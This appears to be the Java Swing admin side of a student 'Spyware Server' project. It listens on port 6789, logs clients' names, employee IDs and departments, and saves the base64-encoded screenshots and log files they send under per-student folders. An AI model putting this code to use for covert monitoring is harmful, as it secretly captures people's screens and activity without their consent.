 /*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package spy.admin;

import database.Database;
import java.awt.Robot;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import org.json.simple.JSONObject;
import org.json.simple.JSONValue;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author root
 */
public class Home extends javax.swing.JFrame implements Runnable {
    Database db;
    public static HashMap<String,Socket> ipmap;
    
    
    List<Socket> clientSockets=new ArrayList<>();
    
    public static byte[] decodeImage(String imageDataString) {
        return Base64.getDecoder().decode(imageDataString);
    }
    /**
     * Creates new form home
     */
    public Home() {
        try {
            db=new Database();            
        } catch (Exception ex) {
            Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
        }

        ipmap=new HashMap();
        this.setVisible(true);
        this.setResizable(true);
        
        initComponents();
        new Thread(this).start();
    }
    
    public void run() //throws Exception
    {
        int n,fact=1;
        try{
            ServerSocket ss = new ServerSocket(6789);
            System.out.println("server is listening at port 6789.....");
//            serverstatus.append("server is listening at port 6789.....\n");
            while(true){
                Socket sock = ss.accept();
                
                clientSockets.add(sock);
                
                System.out.println("Request accepted.");
//                serverstatus.append("Request accepted.\n");
//                clientstatus.append(sock.getRemoteSocketAddress().toString().substring(1).split(":")[0]+" client connected. \n");
                System.out.println(sock.getRemoteSocketAddress().toString().substring(1).split(":")[0]);
                ipmap.put(sock.getRemoteSocketAddress().toString().substring(1).split(":")[0],sock);
                new Handler(sock,ss);
                
                
//                
            }
        }
        catch(IOException e){}
    }
    
    class Handler implements Runnable {
        byte[] mybytearray = new byte[1024];    //create byte array
        Socket sock;
        //Server server = new Server();
        Robot r;
        int down;
        Runtime runtime; Process process;
        int bytesRead;
        Handler (Socket s,ServerSocket ss){
            this.sock=s;
            System.out.println(s.getRemoteSocketAddress().toString());
            
            new Thread(this).start();
            System.out.println("Thread created.");
            
        }
        
        public void run(){
            try{
                r = new Robot();
                //r.delay(2000);
                while(true)
                {
                     String line=null;
                        BufferedReader r = new BufferedReader(new InputStreamReader(sock.getInputStream()));

                        PrintWriter w = new PrintWriter(sock.getOutputStream(), true);
                        w.println("clientdata");
                        w.flush();
                        String jdata = r.readLine();
                        
                        if(jdata.equals(false)){
                            
                        }else{
                          //  System.out.println("status "+jdata);
                            JSONObject obj1 = (JSONObject) JSONValue.parse(jdata);
    //                        System.out.println("object "+obj1);

                            String name = obj1.get("name").toString();
                            System.out.println(name);
                            String pcno = obj1.get("pcno").toString();
                            System.out.println(pcno);
                            String dept = obj1.get("dept").toString();
                            System.out.println(dept);
                            String empid = obj1.get("empid").toString();
                            System.out.println(empid);

    //                        System.out.println(name);
                            db.addClientLog(name,empid, pcno,dept);
                        }
                        
                        
                        
                        w.println("src");
//                        String jdatas = r.readLine();

                        for (String jdatas = r.readLine(); jdatas != null; jdatas = r.readLine()) {
                            //System.out.println(line);
                           //  System.out.println("status "+jdatas);
                             JSONObject obj2 = (JSONObject) JSONValue.parse(jdatas);

                            String fname = obj2.get("filename").toString();
                            String image = obj2.get("image").toString();
                            String studid = obj2.get("studid").toString();
                            
                            //convert from base64 to byte array
                            byte[] imageByteArray = decodeImage(image);

                            //convert byte array to a file image
                            File directory=new File("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/images/screenshots/"+studid+"/");
                            System.out.println("Directory exist: "+directory.exists());
                            if(directory.exists()){

                            }else{
                                directory.mkdir();
                            }
                            FileOutputStream imageOutFile = new FileOutputStream("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/images/screenshots/"+studid+"/"+fname);
                            imageOutFile.write(imageByteArray);
                            imageOutFile.close();
                            
                            String lfname = obj2.get("logfilename").toString();
                            String logfile = obj2.get("logfile").toString();

                            //convert from base64 to byte array
                            byte[] imageByteArray1 = decodeImage(logfile);
                            
                            File directory1=new File("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/logs/"+studid+"/");
                            System.out.println("Directory exist: "+directory1.exists());
                            if(directory1.exists()){

                            }else{
                                directory1.mkdir();
                            }
                            
                            FileOutputStream imageOutFile1 = new FileOutputStream("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/logs/"+studid+"/"+lfname);
                            imageOutFile1.write(imageByteArray1);
                            imageOutFile1.close();
                            
                            
                            db.updateClientLog(studid);
                            
//                            Thread.sleep(5000);

                            w.println("src");
                        }

                       
                    r.close();
                        
                }
            }
            catch(Exception ex) {	
                System.out.println(ex);		
            }//notify(ex.toString()); }///ex.printStackTrace(); }
        }
    }
    

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jPanel2 = new javax.swing.JPanel();
        jPanel4 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        jLabel8 = new javax.swing.JLabel();
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        jMenuItem1 = new javax.swing.JMenuItem();
        jMenuItem3 = new javax.swing.JMenuItem();
        jMenuItem2 = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Admin Panel");
        setResizable(false);

        jPanel1.setBackground(new java.awt.Color(52, 120, 188));
        jPanel1.setPreferredSize(new java.awt.Dimension(744, 668));
        jPanel1.setLayout(new java.awt.CardLayout());

        jPanel2.setBackground(new java.awt.Color(38, 218, 33));
        jPanel2.setPreferredSize(new java.awt.Dimension(744, 668));
        jPanel2.setLayout(new java.awt.CardLayout());

        jPanel4.setBackground(new java.awt.Color(169, 182, 227));

        jLabel1.setFont(new java.awt.Font("Serif", 1, 36)); // NOI18N
        jLabel1.setText("Welcome To Spyware Server");

        jLabel2.setBackground(new java.awt.Color(169, 182, 227));
        jLabel2.setIcon(new javax.swing.ImageIcon(getClass().getResource("/spy/admin/icon.png"))); // NOI18N
        jLabel2.setOpaque(true);

        jLabel3.setBackground(new java.awt.Color(169, 182, 227));
        jLabel3.setFont(new java.awt.Font("SansSerif", 0, 12)); // NOI18N
        jLabel3.setText("Version 0.1");
        jLabel3.setOpaque(true);

        jLabel4.setText("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");

        jLabel5.setIcon(new javax.swing.ImageIcon(getClass().getResource("/spy/admin/icone_client.png"))); // NOI18N
        jLabel5.setText("jLabel5");
        jLabel5.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel5MouseClicked(evt);
            }
        });

        jLabel6.setFont(new java.awt.Font("SansSerif", 0, 18)); // NOI18N
        jLabel6.setText("Clients");

        jLabel7.setBackground(new java.awt.Color(169, 182, 227));
        jLabel7.setIcon(new javax.swing.ImageIcon("C:\\Users\\Hp\\OneDrive\\Documents\\capstoneproject\\spy-admin\\src\\images\\chpwd.png")); // NOI18N
        jLabel7.setOpaque(true);
        jLabel7.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel7MouseClicked(evt);
            }
        });

        jLabel8.setFont(new java.awt.Font("SansSerif", 0, 18)); // NOI18N
        jLabel8.setText("Change Password");
        jLabel8.setToolTipText("");

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addGap(55, 55, 55)
                        .addComponent(jLabel5, javax.swing.GroupLayout.PREFERRED_SIZE, 189, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addGap(120, 120, 120)
                        .addComponent(jLabel6, javax.swing.GroupLayout.PREFERRED_SIZE, 64, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                        .addComponent(jLabel7, javax.swing.GroupLayout.PREFERRED_SIZE, 146, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(133, 133, 133))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                        .addComponent(jLabel8, javax.swing.GroupLayout.PREFERRED_SIZE, 171, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(120, 120, 120))))
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                        .addComponent(jLabel1)
                        .addGap(205, 205, 205))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                        .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 84, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(390, 390, 390))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 126, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(368, 368, 368))))
            .addComponent(jLabel4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addGap(16, 16, 16)
                .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 105, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 28, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(1, 1, 1)
                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 74, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel4, javax.swing.GroupLayout.PREFERRED_SIZE, 14, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addGap(22, 22, 22)
                        .addComponent(jLabel5, javax.swing.GroupLayout.PREFERRED_SIZE, 182, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel6, javax.swing.GroupLayout.PREFERRED_SIZE, 22, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel8, javax.swing.GroupLayout.PREFERRED_SIZE, 35, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 34, Short.MAX_VALUE)
                        .addComponent(jLabel7, javax.swing.GroupLayout.PREFERRED_SIZE, 146, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(238, 238, 238))))
        );

        jPanel2.add(jPanel4, "card2");

        jPanel1.add(jPanel2, "card2");

        jMenu1.setText("File");
        jMenu1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenu1ActionPerformed(evt);
            }
        });

        jMenuItem1.setText("Clients");
        jMenuItem1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem1ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem1);

        jMenuItem3.setText("Change Password");
        jMenuItem3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem3ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem3);

        jMenuItem2.setText("Exit");
        jMenuItem2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem2ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem2);

        jMenuBar1.add(jMenu1);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, 936, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 0, Short.MAX_VALUE))
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents

    private void jMenu1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenu1ActionPerformed
        // TODO add your handling code here:
       
    }//GEN-LAST:event_jMenu1ActionPerformed

    private void jMenuItem2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem2ActionPerformed
        // TODO add your handling code here:
        this.dispose();
    }//GEN-LAST:event_jMenuItem2ActionPerformed

    private void jMenuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem1ActionPerformed
        // TODO add your handling code here:
       
        jPanel2.removeAll();
        jPanel2.repaint();
        jPanel2.revalidate();
        
        jPanel2.add(new Clients(clientSockets));
        jPanel2.repaint();
        jPanel2.revalidate();
    }//GEN-LAST:event_jMenuItem1ActionPerformed

    private void jMenuItem3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem3ActionPerformed
        // TODO add your handling code here:
        ChangePwd cp=new ChangePwd();
        cp.setVisible(true);
    }//GEN-LAST:event_jMenuItem3ActionPerformed

    private void jLabel5MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel5MouseClicked
        jPanel2.removeAll();
        jPanel2.repaint();
        jPanel2.revalidate();
        jPanel2.add(new Clients(clientSockets));
        jPanel2.repaint();
        jPanel2.revalidate(); // TODO add your handling code here:
    }//GEN-LAST:event_jLabel5MouseClicked

    private void jLabel7MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel7MouseClicked
                ChangePwd cp=new ChangePwd();
                cp.setVisible(true);        // TODO add your handling code here:
    }//GEN-LAST:event_jLabel7MouseClicked
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Home().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JMenuItem jMenuItem1;
    private javax.swing.JMenuItem jMenuItem2;
    private javax.swing.JMenuItem jMenuItem3;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel4;
    // End of variables declaration//GEN-END:variables
}
